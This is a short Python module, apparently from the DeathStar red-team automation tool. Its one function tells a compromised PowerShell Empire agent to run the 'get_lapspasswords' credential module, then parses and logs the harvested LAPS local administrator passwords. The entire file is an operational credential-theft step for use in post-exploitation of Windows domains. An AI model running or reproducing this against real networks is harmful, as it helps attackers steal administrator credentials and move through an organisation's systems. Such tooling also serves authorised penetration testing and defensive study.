from deathstar.utils import posh_object_parser, beautify_json


async def crystallize(agent):
    output = await agent.execute("powershell/credentials/get_lapspasswords")

    results = output["results"]
    parsed = posh_object_parser(results)
    log.debug(beautify_json(parsed))
    return parsed
